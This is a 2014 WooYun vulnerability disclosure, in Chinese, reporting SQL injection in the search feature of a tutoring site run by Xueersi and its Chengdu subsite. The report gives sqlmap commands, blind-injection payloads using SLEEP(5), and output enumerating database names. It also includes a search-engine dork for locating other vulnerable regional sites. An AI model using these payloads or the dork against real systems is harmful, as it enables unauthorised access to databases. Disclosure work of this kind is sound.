wybug_title: 学而思某类型网站通用注入
wybug_corp: 好未来集团学而思培优
wybug_detail: 漏洞详情 披露状态：   									2014-09-15：	细节已通知厂商并且等待厂商处理中									2014-09-17：	厂商已经确认，细节仅向厂商公开									2014-09-27：	细节向核心白帽子及相关领域专家公开									2014-10-07：	细节向普通白帽子公开									2014-10-17：	细节向实习白帽子公开									2014-10-30：	细节向公众公开  简要描述： 只求高rank~~~ 详细说明：  问题出在 http://souke.jiajiaoban.com/  的搜索功能上搜索注入 类似静态http://souke.jiajiaoban.com/searchs/search/tuiguang:/kemu:/nianji:/xuequ:/teachername:1/sex:/status:teachername存在注入 其他点未测试inurl:searchs/search/tuiguang 搜索这个关键字则发现还有大量各地方网站均存在一样的注入选取2例http://souke.jiajiaoban.com/searchs/search/tuiguang:/kemu:/nianji:/xuequ:/teachername:1/sex:/status:sqlmap:sqlmap -u "http://souke.jiajiaoban.com/searchs/search/tuiguang:/kemu:/nianji:/xuequ:/teachername:1*/sex:/status:" --dbsPlace: URIParameter: #1*    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://souke.jiajiaoban.com:80/searchs/search/tuiguang:/kemu:/nianji:/xuequ:/teachername:1%' AND 4229=4229 AND '%'='/sex:/status:    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: http://souke.jiajiaoban.com:80/searchs/search/tuiguang:/kemu:/nianji:/xuequ:/teachername:1%' AND SLEEP(5) AND '%'='/sex:/status:---[16:14:47] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5.0.11[16:14:47] [INFO] fetching database names[16:14:47] [INFO] fetching number of databases[16:14:47] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[16:14:47] [INFO] retrieved: [16:14:51] [WARNING] reflective value(s) found and filtering out4[16:14:54] [INFO] retrieved: information_schema[16:16:56] [INFO] retrieved: mysql[16:17:28] [INFO] retrieved: test[16:18:00] [INFO] retrieved: zkavailable databases [4]:[*] information_schema[*] mysql[*] test[*] zk   漏洞证明：  成都分站：sqlmap -u "http://cdsouke.jiajiaoban.com/searchs/search/tuiguang:/kemu:/nianji:/xuequ:/teachername:1*" --dbsPlace: URIParameter: #1*    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://cdsouke.jiajiaoban.com:80/searchs/search/tuiguang:/kemu:/nianji:/xuequ:/teachername:1%' AND 9714=9714 AND '%'='    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: http://cdsouke.jiajiaoban.com:80/searchs/search/tuiguang:/kemu:/nianji:/xuequ:/teachername:1%' AND SLEEP(5) AND '%'='---[16:19:23] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5.0.11[16:19:23] [INFO] fetching database names[16:19:23] [INFO] fetching number of databases[16:19:23] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[16:19:23] [INFO] retrieved: [16:19:23] [WARNING] reflective value(s) found and filtering out4[16:19:25] [INFO] retrieved: information_schema[16:20:08] [INFO] retrieved: mysql[16:20:21] [INFO] retrieved: test[16:20:33] [INFO] retrieved: zk028available databases [4]:[*] information_schema[*] mysql[*] test[*] zk028   修复方案：  看看还有没有其他站点使用同类的     版权声明：转载请注明来源 玉林嘎@乌云
